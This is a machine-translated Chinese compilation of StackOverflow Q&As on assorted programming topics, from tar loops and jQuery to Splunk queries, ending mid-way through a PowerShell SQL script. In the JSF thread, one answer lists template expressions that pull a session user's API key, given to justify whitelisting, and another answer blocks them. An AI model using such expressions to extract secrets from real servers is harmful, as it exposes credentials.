# StackOverflow 问答 15936000-15936999

# meteor - 如何在流星视图模板中显示错误

> ID：15936000
> 
> 赞同：3
> 
> 时间：2013-04-10T20:43:48.630
> 
> 标签：meteor

如何获取我在集合或方法的失败插入中引发的错误的值。

```
Customers.allow({
insert: function(userID, rec) {
    console.log(userID === rec.userID);

    if (rec.userID === null) {
        throw new Meteor.Error(600, "You must be logged in");
    };

    if (rec.phone.length != 10 ) {
        throw new Meteor.Error(601, "Incorect phone format", "Phone must be 10 chars long");
    };

    if (rec.fax.length != 10 ) {
        throw new Meteor.Error(602, "Incorect fax format", "Fax must be 10 chars long");
    };

    return userID === rec.userID;
} 
```

});

所以现在我在控制台上看到了错误，但是说如果想要在模板中显示错误或将其存储在反应会话中，以便可以显示给用户进行更正。

喜欢尝试这样的事情。

```
Template.form.errors = function () {
   // return however you get to those thrown errors
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T21:07:59.913

今天刚刚发布了一个包来帮助解决这个问题：[https ://github.com/tmeasday/meteor-errors](https://github.com/tmeasday/meteor-errors)

你需要陨石才能使用它：[https ://github.com/oortcloud/meteorite](https://github.com/oortcloud/meteorite)

添加带有陨石的包：

```
mrt add errors 
```

（不用担心，除了命令之外，您不会向流星添加错误；）

然后，您可以在客户端 js 中抛出错误：

```
Meteor.Errors.throw("Error details"); 
```

然后，在您的 HTML 中，无论您想在哪里显示错误：

```
{{>meteorErrors}} 
```

# linux - 为每个目录创建一个 tar 文件

> ID：15936003
> 
> 赞同：30
> 
> 时间：2013-04-10T20:43:57.970
> 
> 标签：linux, bash, shell

我有一堆需要恢复的目录，但必须先将它们打包成 .tar。是否有一个脚本可以让我将所有 100 多个目录打包到他们自己的 tar 中，这样 dir 就变成了 dir.tar。

到目前为止尝试：

```
for i in *; do tar czf $i.tar $i; done 
```

* * *

## 回答 #1

> 赞同：75
> 
> 时间：2013-04-10T23:55:16.407

如果目录名称中有一些空格，则您编写的脚本将不起作用，因为名称将被拆分，并且如果文件存在于此级别，它也会 tar 文件。

您可以使用此命令不递归地列出目录：

```
find . -maxdepth 1 -mindepth 1 -type d 
```

而这个对每个执行一个 tar ：

```
find . -maxdepth 1 -mindepth 1 -type d -exec tar cvf {}.tar {}  \; 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-04-11T00:48:03.510

您在该级别是否有任何带有空格的目录名称？如果没有，您的脚本将正常工作。

我通常做的是编写一个脚本，其中包含我要执行的命令回显：

```
$ for i in *
do
    echo tar czf $i.tar $i
done 
```

然后你可以查看输出，看看它是否在做你想做的事。确定程序可以运行后，编辑命令行并删除`echo`命令。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2014-07-09T13:42:07.810

如果目录名称中有空格，则只需将变量放在双引号内：

```
for i in *
 do
     tar czf "$i.tar" "$i"
 done 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2019-10-10T14:46:05.237

**用GNU Parallel**简单地和并行地完成它们：

```
parallel tar -cf {}.tar {} ::: * 
```

如果你想在不实际做任何事情的情况下检查它会做什么，添加`--dry-run`如下：

```
parallel --dry-run tar -cf {}.tar {} ::: * 
```

**样本输出**

```
tar -cf ab.tar ab
tar -cf cd.tar cd 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-05-05T08:01:34.930

如果目录数量很大并且它们的名称太长

在执行第一条语句后

```
 for i in *
    do
     echo tar czf $i.tar $i
    done 
```

你会得到错误“字符串太长”

# java - 如何在 JSF 页面上禁用#{session}？

> ID：15936004
> 
> 赞同：2
> 
> 时间：2013-04-10T20:43:59.753
> 
> 标签：java, session, jsf-2

我正在使用 JSF 2.2。我正在尝试将 JSF 用作纯模板语言。但是，有一个问题。在我的环境中创建 JSF 页面的任何用户都可以执行以下操作：

```
#{session.getAttribute('user').getApiKey()} 
```

在这里，我有一个存储在会话中的用户对象，getApiKey() 方法是该类中的 getter。

是否有“web.xml”配置或其他一些技巧可以用来在 JSF 页面上完全禁用会话对象？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T21:03:12.670

> *是否有“web.xml”配置或其他一些技巧可以用来在 JSF 页面上完全禁用会话对象？*

不。

根据允许的标签、属性和 EL 表达式的白名单手动解析模板（注意：不要使用黑名单，黑客会找到你想不到的方法）。例如，以下表达式与 具有相同的效果`#{session.getAttribute('user').getApiKey()}`：

*   `#{request.session.getAttribute('user').apiKey}`
*   `#{sessionScope.user.apiKey}`
*   `#{user.apiKey}`
*   `#{facesContext.externalContext.sessionMap.user.apiKey}`
*   `#{facesContext.externalContext.session.getAttribute('user').apiKey}`

毕竟，JSF/Facelets 可能是错误的工具，无法为客户提供某种将在服务器中执行的模板。而是寻找[类似](http://jsoup.org/cookbook/cleaning-html/whitelist-sanitizer)[BB](http://en.wikipedia.org/wiki/BBCode) / [Wiki](http://en.wikipedia.org/wiki/Wiki_markup) / [Markdown](http://en.wikipedia.org/wiki/Markdown)的标记或您通过.`<h:outputText escape="false">`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-10T21:27:56.437

也许。隐式变量由特定的 ELResolver 提供。从 ELResolvers 列表中删除那个，或者添加一个自己的解析器，该解析器总是为该列表的所有隐式变量返回 null，应该可以解决问题。

顺便说一句，我不知道 JSF 是否提供了一个公共 API 来做这件事，或者规范甚至允许这样的事情。

无论哪种方式，如果您只需要一个模板引擎，有更简单的选项可以定制一个有状态的、基于组件的 Web 应用程序框架......

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-11T16:32:47.637

这是我为解决这个问题所做的。这个类本质上撤销了对页面上所有核心对象的访问。此外，我添加了一个实用程序变量来访问上下文路径。我试过这个，它似乎**工作！**.

```
package com.example.templates.jsf;

import javax.el.ELContext;
import javax.el.ELException;
import javax.el.PropertyNotFoundException;
import javax.faces.component.UIComponent;
import javax.faces.context.ExternalContext;
import javax.faces.context.FacesContext;

import com.sun.faces.component.CompositeComponentStackManager;
import com.sun.faces.el.ImplicitObjectELResolver;
import com.sun.faces.util.MessageUtils;

/**
 *  This class revokes access to server page context objects 
 */
public class CustomImplicitObjectELResolver extends ImplicitObjectELResolver {

public static final int CONTEXT_PATH = 19;

public CustomImplicitObjectELResolver(){
    super();

    // Revoke access to variables that can potentially
    // give access to internal class objects.
    IMPLICIT_OBJECTS.remove("facesContext");
    IMPLICIT_OBJECTS.remove("session");
    IMPLICIT_OBJECTS.remove("sessionScope");
    IMPLICIT_OBJECTS.remove("application");
    IMPLICIT_OBJECTS.remove("applicationScope");
    IMPLICIT_OBJECTS.remove("request");
    IMPLICIT_OBJECTS.remove("requestScope");
    IMPLICIT_OBJECTS.remove("view");
    IMPLICIT_OBJECTS.remove("viewScope");
    IMPLICIT_OBJECTS.remove("initParam");
    IMPLICIT_OBJECTS.remove("component");       
    IMPLICIT_OBJECTS.remove("cookie");
    IMPLICIT_OBJECTS.remove("header");
    IMPLICIT_OBJECTS.remove("headerValues");
    IMPLICIT_OBJECTS.remove("flowScope");

    // My own utility method
    IMPLICIT_OBJECTS.put("contextPath", CONTEXT_PATH);
}

@Override
public Object getValue(ELContext context,Object base, Object property)
        throws ELException {
    // variable resolution is a special case of property resolution
    // where the base is null.
    if (base != null) {
        return null;
    }
    if (property == null) {
        String message = MessageUtils.getExceptionMessageString
            (MessageUtils.NULL_PARAMETERS_ERROR_MESSAGE_ID, "property");
        throw new PropertyNotFoundException(message);
    }

    Integer index = IMPLICIT_OBJECTS.get(property.toString());

    if (index == null) {
        return null;
    } else {
        FacesContext facesContext = (FacesContext) context.getContext(FacesContext.class);
        ExternalContext extCtx = facesContext.getExternalContext();
            switch (index) {

            case COMPOSITE_COMPONENT:
                // The following five lines violate the specification.
                // The specification states that the 'cc' implicit object
                // always evaluates to the current composite component,
                // however, this isn't desirable behavior when passing
                // attributes between nested composite components, so we
                // need to alter the behavior so that the components behave
                // as the user would expect.
                /* BEGIN DEVIATION */
                CompositeComponentStackManager manager =
                      CompositeComponentStackManager.getManager(facesContext);
                Object o = manager.peek();
                /* END DEVIATION */
                if (o == null) {
                    o = UIComponent.getCurrentCompositeComponent(facesContext);
                }
                context.setPropertyResolved(o != null);
                return o;
            case PARAM:
                context.setPropertyResolved(true);
                return extCtx.getRequestParameterMap();
            case PARAM_VALUES:
                context.setPropertyResolved(true);
                return extCtx.getRequestParameterValuesMap();
            case CONTEXT_PATH:
                context.setPropertyResolved(true);
                return extCtx.getRequestContextPath();
            case RESOURCE:
                context.setPropertyResolved(true);
                return facesContext.getApplication().getResourceHandler();
            default:
                return null;
        }
    }
} 
```

}

接下来，在 faces-config.xml 中，添加以下条目：

```
<application>
    <el-resolver>
        com.example.templates.jsf.CustomImplicitObjectELResolver
    </el-resolver>
</application> 
```

# vb.net - 更改包含drawitem上特定字符串的列表框上特定项目的颜色

> ID：15936006
> 
> 赞同：5
> 
> 时间：2013-04-10T20:44:06.517
> 
> 标签：vb.net, listbox

我想更改包含特定字符串的项目的颜色

```
Private Sub ListBox2_DrawItem(ByVal sender As Object, ByVal e As System.Windows.Forms.DrawItemEventArgs) Handles ListBox2.DrawItem
    e.DrawBackground()
    If DrawItemState.Selected.ToString.Contains("specific string") Then
        e.Graphics.FillRectangle(Brushes.LightGreen, e.Bounds)
    End If

    e.DrawFocusRectangle() 
```

那是我的代码，但不工作

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-04-11T06:30:56.710

好的，首先您需要将列表框的属性DrawMode设置为“OwnerDrawFixed”而不是Normal。否则，您将永远无法触发 DrawItem 事件。完成后，一切都非常简单。

```
Private Sub ListBox1_DrawItem(sender As System.Object, e As System.Windows.Forms.DrawItemEventArgs) Handles ListBox1.DrawItem
    e.DrawBackground()

    If ListBox1.Items(e.Index).ToString() = "herp" Then

        e.Graphics.FillRectangle(Brushes.LightGreen, e.Bounds)
    End If
    e.Graphics.DrawString(ListBox1.Items(e.Index).ToString(), e.Font, Brushes.Black, New System.Drawing.PointF(e.Bounds.X, e.Bounds.Y))
    e.DrawFocusRectangle()
End Sub 
```

如果选择，您将不得不使用不同的颜色对其进行修饰。但这应该足以让您继续工作。你很亲密，记住这一点。:)

# php - 在 apache 服务器上使用 PHP 将 ppt/pptx 转换为 JPG/PNG

> ID：15936010
> 
> 赞同：2
> 
> 时间：2013-04-10T20:44:15.913
> 
> 标签：php, image, powerpoint

有人知道在 apache 服务器上使用 PHP 将 ppt/pptx 幻灯片转换为服务器上的图像的方法吗？

据我了解，一种方法是在服务器上安装microsoft powerpoint（或openoffice？）以便将powerpoint保存为图像？

您将如何在服务器上安装它？

如果无法在服务器上安装程序怎么办？

我已经看到用于在本地机器上打开应用程序并将 ppt/pptx 保存为图像的 COM 类......但在远程机器上，COM 类不存在。

任何帮助/线索将不胜感激！

编辑：

我看到 COM 类是一个仅限 Windows 的扩展......那么还有其他方法吗？

再次感谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-10T20:55:15.677

OpenOffice 支持称为 UNO 的编程接口，可以使用[PUNO](http://www.wstech2.net/index.php?do=0a,01,05)扩展从 PHP 调用，该扩展可用于 Windows 或 Linux（但不是 Mac）服务器。

它确实需要在服务器上安装 Open Office，启用 Java 支持并侦听 TCP/IP 套接字。由于这不是默认配置，它确实涉及一些设置。您还必须下载 PUNO 并将其添加到您的 PHP 配置中。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-01-23T01:42:58.813

该服务器是一个 Amazon EC2 实例，因此在大多数情况下，它是唯一的 CLI。

我所做的是：

我已经安装了[Libreoffice（无头）](http://diegolamonica.info/how-to-make-libreoffice-headless-to-work-on-centos-6-3/)，用于`exec()`在 PHP 中将文档转换为 PDF。

从那里我使用ghostscript（已经安装在服务器上）通过使用从生成的PDF中提取图像`exec()`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2019-03-19T07:44:23.567

您可以使用以下库 API 将 ppt 文件转换为 jpg

```
require __DIR__ . '/../lib/ConvertApi/autoload.php';

use \ConvertApi\ConvertApi;    ConvertApi::setApiSecret(CONVERT_API_SECRET);
    $result = ConvertApi::convert('jpg', [
            'File' => '/path/to/ppt',
        ], 'pptx'
    );
    $result->saveFiles('/path/to/result/dir'); 
```

[将 PPT 转换为 JPG](https://www.convertapi.com/pptx-to-jpg)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-10T20:58:53.910

正如 Mark Ba​​ker 所描述的，从 php 中的幻灯片中获取图像可能会非常痛苦，但是如果您现在使用一些 VBA，则可以非常简单地制作一个 vba marco 来将每张幻灯片导出为 jpg。比一次上传 jpg 文件对我来说似乎更容易解决，因为这不完全是你想要的。只是我的两个感觉。

这是一个 VBA 示例：http: [//vbadud.blogspot.nl/2009/05/save-powerpoint-slides-as-images-using.html](http://vbadud.blogspot.nl/2009/05/save-powerpoint-slides-as-images-using.html)

# javascript - 调用以变量命名的 jQuery 方法

> ID：15936011
> 
> 赞同：1
> 
> 时间：2013-04-10T20:44:18.470
> 
> 标签：javascript, jquery

我有一个 JavaScript 变量，其中包含一个 jQuery 方法的名称：

```
var method = 'attr("src")'; 
```

我怎样才能让它像这样工作：

```
console.log($('img').method) 
```

我试过了

```
console.log($('img')[method]()) 
```

但它给出了这个错误：

```
Uncaught TypeError: Object [object Object] has no method 'attr("src")' 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-10T20:55:30.373

您遇到的问题是您将方法名称及其参数都*编码*在一个字符串中。

相反，如果您有一个首先包含方法名称然后是参数的*数组*，这将很容易，根据我刚刚拼凑的以下琐碎插件：

```
(function($) {
    $.fn.invoke = function(args) {
        var method = args.shift();
        return $.fn[method].apply(this, args);
    }
})(jQuery);

var method = ['attr', 'src'];
var src = $('img').invoke(method); 
```

见[http://jsfiddle.net/7rBDe/1/](http://jsfiddle.net/7rBDe/1/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T20:48:44.847

尝试这个：

```
function fun(funcName){
  return $('img')[funcName]('src');
}

fun('attr'); 
```

这是一个非常简单的方法，但它有效，因为`$('img').attr('src')`如果你写这个是一样的`$('img')['attr']('src')`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-10T20:52:02.790

您也可以使用新功能，与 eval 的范围不同：

```
(new Function( "return $('img')."+method )()) 
```

[http://jsfiddle.net/J9zU4/](http://jsfiddle.net/J9zU4/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-10T20:58:24.450

您所描述`method`的实际上是方法和参数的组合。如果您可以将事情分解为方法名称和参数，您可以执行以下操作：

```
var method = 'attr';
var param = 'class';
$('.post-text')[method](param);  // returns "post-text" on this page. 
```

这与以下内容相同：

```
$('post-text').attr('class'); 
```

# c# - lambda 表达式中的 OR 语句

> ID：15936014
> 
> 赞同：0
> 
> 时间：2013-04-10T20:44:39.300
> 
> 标签：c#, lambda

做这样的事情的正确方法是什么。

```
db.Tasks.Where(t => {t.CategoryId == 1 || t.CategoryId == 2) ||  t.CategoryId == 3)}).ToList(); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-10T20:46:30.490

您的括号目前是错误的，无论是花括号还是普通括号。您实际上不需要表达式中的任何括号 - 这很好（为清晰起见重新格式化）：

```
var list = db.Tasks
             .Where(t => t.CategoryId == 1 || 
                         t.CategoryId == 2 ||
                         t.CategoryId == 3)
             .ToList(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-10T20:46:06.307

一个 lambda 表达式就是这样——它由一个普通的*表达式*组成。（如`a || b || c`）

大括号用于语句，而不是表达式。
只需删除`{}`，就可以了。

你也有一些流浪`)`。

# c++ - 为什么向量初始化构造和复制？

> ID：15936017
> 
> 赞同：5
> 
> 时间：2013-04-10T20:44:43.380
> 
> 标签：c++, c++11

我正在学习 C++，并且一直在研究 STL 容器。我有很多问题，但我认为这可以先解决。考虑这个类和它的向量。

```
class A {
   int i;
   // A(const A&);
public:

   A(int i) : i(i) {cout << "consting " << i << endl;}
   A(const A& ot) : i(ot.i) {cout << "copying " << i << endl;}

};

int main () {
   vector<A> v1 = {A(1),A(2),A(3),A(4)};
   vector<A> v2(1,A(5));
   vector<A> v3;
   v3.push_back(A(6));
} 
```

给我输出

```
consting 1
consting 2
consting 3
consting 4
copying 1
copying 2
copying 3
copying 4
consting 5
copying 5
consting 6
copying 6 
```

显然，它正在构建和复制每个`A`.

有什么方法可以防止这种情况。我的意思是我怎样才能避免额外的副本，而只是构建`A`到向量中。这可能吗。如果没有，有人可以解释为什么吗？谢谢你。

编辑：只是为了完成的缘故`push_back`做同样的事情

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-10T21:00:28.083

不幸的是，列表初始化需要带有`std::vector`. 如果您知道您的容器是固定大小的，一种替代方法是使用`std::array`：

```
std::array<A, 4> a1 = {{A(1),A(2),A(3),A(4)}};

stdout:
consting 1
consting 2
consting 3
consting 4 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-10T20:48:36.980

当使用像这样的初始化列表构造函数时，你不能避免有一个副本。另一种方法是在开始时保留适当的容量，然后`emplace_back`是每个对象：

```
vector<A> v1;
v1.reserve(4);
v1.emplace_back(1);
v1.emplace_back(2);
v1.emplace_back(3);
v1.emplace_back(4); 
```

[如您所见](http://ideone.com/gvfzFz)，这只会产生以下输出：

```
consting 1
consting 2
consting 3
consting 4 
```

# asp.net - 将内联变量传递给 aspx 代码隐藏方法

> ID：15936019
> 
> 赞同：0
> 
> 时间：2013-04-10T20:45:07.830
> 
> 标签：asp.net

我试图弄清楚如何使用内联变量调用方法，例如下面的示例 f。

```
<table stuff here>
<% foreach (Foo f in listOfFoos) { %>
<tr>
    <td>
        <%= Fubar(f)%>
    </td>
    <td>
        <%= Fubar1(f) %>
    </td>
    <td>
        <%= Fubar2(f)%>
    </td>
    <td>
        <%= Fubar3(f)%>
    </td>
    <td>
        <%= Fubar4(f)%>
    </td>
    <td>
        <%= Fubar5(f)%>
    </td>
    <td>

    <asp:Button Text="Click me!" runat="server"  OnClick="FooBar"/>

    </td>
</tr> 
```

方法的定义看起来像（在后面的代码中定义）

```
public void FooBar(Foo myFoo); 
```

我想在点击时调用该方法，并传入 f. 我是asp.net的新手！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:08:11.357

请改用中继器。从我的脑海中添加这个可能会有一些错误，但使用中继器的想法是重要的部分。

**ASPX**

```
<table>
<asp:Repeater ID="rptFubars" runat="server">
    <ItemTemplate>
        <tr>
            <td>
                <%# Fubar(Container.DataItem as [DATA_ITEM_TYPE!!])%>
            </td>
            <td>
                <%# Fubar1(Container.DataItem as [DATA_ITEM_TYPE!!])%>
            </td>
            <td>
                <%# Fubar2(Container.DataItem as [DATA_ITEM_TYPE!!])%>
            </td>
            <td>
                <%# Fubar3(Container.DataItem as [DATA_ITEM_TYPE!!])%>
            </td>
            <td>
                <%# Fubar4(Container.DataItem as [DATA_ITEM_TYPE!!])%>
            </td>
            <td>
                <%# Fubar5(Container.DataItem as [DATA_ITEM_TYPE!!])%>
            </td>
            <td>

            <asp:Button Text="Click me!" runat="server"  OnClick="FooBar"/>

            </td>
        </tr>
    </ItemTemplate>
</asp:Repeater>
</table> 
```

**代码背后**

```
rptFubars.DataSource = listOfFoos;
rptFubars.DataBind(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T21:10:37.530

首先 FooBar 必须有这个签名：

```
private void FooBar(object sender, EventArgs e)
{
} 
```

但是，最好使用[OnCommand](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.button.oncommand.aspx)而不是 OnClick，将 f 的 Id（或 f 的其他标识符）作为 CommandArgument 传递。

```
<table stuff here>
 <% foreach (Foo f in listOfFoos) { %>
  <tr>
   <td>
     <%= Fubar(f)%>
   </td>
   <td>
     <%= Fubar1(f) %>
   </td>
   <td>
     <%= Fubar2(f)%>
   </td>
   <td>
     <%= Fubar3(f)%>
   </td>
   <td>
     <%= Fubar4(f)%>
   </td>
   <td>
     <%= Fubar5(f)%>
   </td>
   <td>
     <asp:Button Text="Click me!" runat="server"  OnCommand="FooBar" CommandName="SomeCommnad" CommandArgument="<%= f.Id >" />
   </td>
 </tr>
... 
```

FooBar 的签名将是：

```
private void FooBar(Object sender, CommandEventArgs e)
{} 
```

# icalendar - 这个 ICalendar 有什么问题

> ID：15936020
> 
> 赞同：0
> 
> 时间：2013-04-10T20:45:10.973
> 
> 标签：icalendar

我已经在几个验证器中尝试过这个。它通过了。有人可以请教这是怎么回事。我没有在我们的任何智能手机和 Lotus Notes 中加载

```
BEGIN:VCALENDAR
VERSION:2.0
PRODID:-//Company Name//NONSGML Intranet Outage Cal//EN
CALSCALE:GREGORIAN
METHOD:REQUEST
BEGIN:VEVENT
DTSTART:20130421T000000
DTEND:20130421T003000
DTSTAMP:20130410T163211
ORGANIZER:MAILTO:nasl2webmaster@company.com
UID:calendar@company.com
LOCATION:EAF #1
TRANSP:OPAQUE
SEQUENCE:0
SUMMARY:Outage Calendar : added\, EAF #1 outage
PRIORITY:5
X-MICROSOFT-CDO-IMPORTANCE:1
CLASS:PUBLIC
X-FRS-EXT-BUILDNO;X-FRS-SEND=SEND:8.03.80716
X-FRS-EXT-OPLINK;X-FRS-SEND=SEND:205A5936304D412A315F4B3026512E
X-FRS-EXT-RECTYPE;X-FRS-SEND=SEND:A
BEGIN:VALARM
TRIGGER:-PT20H
ACTION:DISPLAY
DESCRIPTION:Reminder:EAF #1 outage
END:VALARM
END:VEVENT
END:VCALENDAR 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-11T14:29:45.670

您正在使用 METHOD:REQUEST，但您的邀请没有 ATTENDEE PROPERTY。请参阅[https://www.rfc-editor.org/rfc/rfc5546#section-3.2.2](https://www.rfc-editor.org/rfc/rfc5546#section-3.2.2)，其中指明了哪些属性是强制性的。如果您只想“发布”事件，则应使用 METHOD:PUBLISH（或根本不使用方法）。

当然可能还有其他问题，但我会先解决这个问题。

最后，您使用的是浮动时间（在您的 DTSTART/DTEND 中没有结束 Z，也没有时区信息）。这不是无效的，但一般来说，日历用户代理不太喜欢。您可能想改用 zulu (utc) 时间。见[https://www.rfc-editor.org/rfc/rfc5545#section-3.3.5](https://www.rfc-editor.org/rfc/rfc5545#section-3.3.5)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T20:50:43.810

你遇到了什么错误？我可以在 Outlook、谷歌日历和 iPhone 中完美加载它。

# ruby-on-rails - Informix 连接从 Rails 应用程序中消失

> ID：15936024
> 
> 赞同：2
> 
> 时间：2013-04-10T20:45:27.550
> 
> 标签：ruby-on-rails, ruby-on-rails-3, database-connection, informix

我正在从 Rails 应用程序连接到 Informix 数据库，有时应用程序会死机（似乎需要重新启动），并显示以下错误消息：

```
Informix::DatabaseError: Connection does not exist: SELECT first 300 blah from ... 
```

这个应用程序在有大量防火墙和网络交换机的环境中运行，我敢肯定那里有一些东西会强行终止长时间保持打开状态的连接。

在我在 Java 中使用过的大多数连接池中，有一些方法可以在将连接分发到池之前运行测试 SQL，设置连接可以打开的最长时间，应该空闲多长时间等。有吗在 Rails 应用程序中定义这些设置的方法？

如果重要的话，这里有一些似乎与此问题相关的 gems 版本：

```
Using activerecord (3.0.7) 
Using ruby-informix (0.7.3) 
Using activerecord-informix-adapter (1.1.1) 
Using activeresource (3.0.7) 
Using rails (3.0.7) 
```

# comparison - 比较两个不同 Splunk 搜索的两列中的值

> ID：15936027
> 
> 赞同：2
> 
> 时间：2013-04-10T20:45:44.697
> 
> 标签：comparison, splunk

我是 splunk 的新手，在比较两个不同查询的两列中的值时遇到了问题。

**查询 1**

```
index="abc_ndx" source="*/jkdhgsdjk.log" call_id="**" A_to="**" A_from="**" | transaction call_id keepevicted=true | search "xyz event:" | table _time, call_id, A_from, A_to | rename call_id as Call_id, A_from as From, A_to as To 
```

**查询 2**

```
index="abc_ndx" source="*/ jkdhgsdjk.log" call_id="**" B_to="**" B_from="**" | transaction call_id keepevicted=true | search " xyz event:"| table _time, call_id, B_from, B_to | rename call_id as Call_id, B_from as From, B_to as To 
```

这是我的两个不同的查询。我想将`A_from`列中的每个值与列中的每个值进行比较`B_from`，如果值匹配，则显示`A_from`.

可能吗？

我已经分别运行了这两个查询，并将每个查询的结果导出到 csv 和使用的`vlookup`函数中。但问题是***最多可以导出 10000 行***数据，所以我错过了很多数据，因为我的数据搜索有超过 10000 条记录。有什么帮助吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T12:06:17.287

目前还没有任何数据可以对此进行测试，但是，以下内容应该为您指明正确的方向。

当您整理出第一个查询的表时，您应该将搜索字符串“管道”到`appendcols`带有第二个搜索字符串的命令。此命令将允许您运行子搜索并将列“导入”到您的基本搜索中。

一旦你在同一个表中有两列。您可以使用该`eval`命令创建一个新字段，该字段比较两个值并根据需要分配一个值。

希望这可以帮助。

[http://docs.splunk.com/Documentation/Splunk/5.0.2/SearchReference/Appendcols](http://docs.splunk.com/Documentation/Splunk/5.0.2/SearchReference/Appendcols) [http://docs.splunk.com/Documentation/Splunk/latest/SearchReference/Eval](http://docs.splunk.com/Documentation/Splunk/latest/SearchReference/Eval)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-17T18:47:19.163

我不确定为什么需要将其保留为两个单独的查询。一切都来自相同的源类型，并且使用几乎相同的数据。所以我会做如下的事情：

```
index="abc_ndx" source="*/jkdhgsdjk.log" call_id="**" (A_to="**" A_from="**") OR (B_to="**" B_from="**") 
| transaction call_id keepevicted=true 
| search "xyz event:" 
| eval to=if(A_from == B_from, A_from, "no_match")
| table _time, call_id, to 
```

这会从您指定的源类型和索引中获取所有事件，这些事件具有 call_id 以及 A_to 和 A_from 或 B_to 和 B_from。然后它处理所有这些，让您根据“xyz 事件：”进行过滤（无论是什么）

然后它创建一个名为“to”的新字段，当 A_from == B_from 时显示 A_from，否则显示“no_match”（占位符，因为您没有指定当它们不匹配时应该做什么）

还有一种方法可以在不使用事务的情况下解决这个问题。虽然没有更多关于基础数据的细节，但我不能肯定地说。基本思想是，如果您有一个公共字段（在本例中为 call_id），您可以只使用 stats 来收集与该字段关联的值，而不是使用昂贵的事务命令。

例如：

```
index="abc_ndx" index="abc_ndx" source="*/jkdhgsdjk.log" call_id="**"
| stats last(_time) as earliest_time first(A_to) as A_to first(A_from) as A_from first(B_to) as B_to first(B_from) as B_from by call_id 
```

如果每个 call_id 只有一个值，则使用 first() 或 last() 实际上并不重要。（您甚至可以使用 min() max() av​​g() 并且您会得到相同的结果）也许这将帮助您更轻松地获得所需的输出。

# android - 转换为 dalvik 格式失败，andengine 动态壁纸出现错误 1

> ID：15936031
> 
> 赞同：0
> 
> 时间：2013-04-10T20:46:06.447
> 
> 标签：android, andengine, dalvik

**我用andEngine**构建了一个视差动态壁纸。我导出的`.apk`没有任何问题。我复制了项目，更新了包和应用程序名称以及重新发布为新的`.apk`. 该应用程序在我的平板电脑上测试良好。但是当我尝试导出它时，它会抛出：

```
conversion to dalvik format failed with error 1 
```

在搜索论坛之后，以下是我尝试解决问题的方法，但均无济于事。

*   将 proGuard 更新到最新版本。
*   将 SDK 更新到最新版本。
*   从工作区中删除项目，更改其目录并重新导入。
*   在 Java Build Path->libraries 中删除除 Android 'version#' 之外的所有内容
*   删除 Java Build Path->libraries 中的所有内容并运行修复项目属性。
*   删除并重新生成`R.txt`bin 中的文件。
*   `.jar`从 libs 目录中清除文件。
*   更改我的`.apk`和密钥库目录。
*   在完成上述所有操作后清理项目。
*   在完成上述所有操作后刷新项目。
*   在完成上述所有操作之后运行修复项目属性。

有时出口商不会抛出错误。但它不构建`.apk`，它只是构建密钥库并关闭。

我很困惑。如果有人有洞察力，那将是无价的。

太感谢了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-20T04:07:18.550

我对最新的 Android SDK (API 17) 也有同样的问题。我尝试了以上所有方法都没有成功。然后我恢复了所有更改，这就是现在对我有用的方法：

1.  清洁项目
2.  关闭 Eclipce
3.  清理临时目录（在 Windows 上，%TEMP%）
4.  打开 Eclipse，导出（有时我会再次清理项目）

通常发生的情况是临时目录将包含以前导出的一些文件，这些文件会导致问题，并且在使用它们时您无法删除它们。因此，“关闭日食”步骤。

请注意，某些文件将保留在临时文件中，您将无法删除它们 - 不用担心，其他一些程序会使用它们。

# sql - 数据库权限匹配运行 PowerShell 脚本的人，而不是连接字符串中指定的权限

> ID：15936032
> 
> 赞同：1
> 
> 时间：2013-04-10T20:46:05.597
> 
> 标签：sql, powershell, connection-string, database-permissions, integrated-security

我希望 SQL Server 权限符合我在连接字符串中指定的 ID，而不是那些碰巧正在运行 PowerShell 脚本的人（通常是我）。

例如，我有一个名为“MyTable”的表，我可以更新它，但“TestIDRestricted”不能。

我以“TestIDRestricted”身份登录 Microsoft SQL Server Management Studio 并运行以下查询

```
select MyField
from MyTable
where ID = 2 
```

我看到它返回“4”。我现在尝试更新：

```
update MyTable
set MyField = 5
where ID = 2 
```

正如预期的那样，我得到以下失败结果：

```
Msg 229, Level 14, State 5, Line 1
The UPDATE permission was denied on the object 'MyTable', database 'mydb', schema 'dbo'. 
```

接下来，我运行以下 UpdateProblem.ps1 PowerShell 脚本：

```
$ConnectionString = "Server=MyServer\MSSQL2012;Database=mydb;User Id= TestIDRestricted;Password=secretpasswd;"
$ConnectionString = $ConnectionString + "Trusted_Connection = yes;Persist Security Info=False"
$SqlConnection = New-Object System.Data.SqlClient.SqlConnection
$SqlConnection.ConnectionString = $ConnectionString
$sqlConnection.Open()
$sqlCommand = $sqlConnection.CreateCommand()
$updateSQL ="update MyTable set MyField = 5 where ID = 2"
$sqlCommand.CommandText = $updateSQL 
write-host $updateSQL
#following command should fail
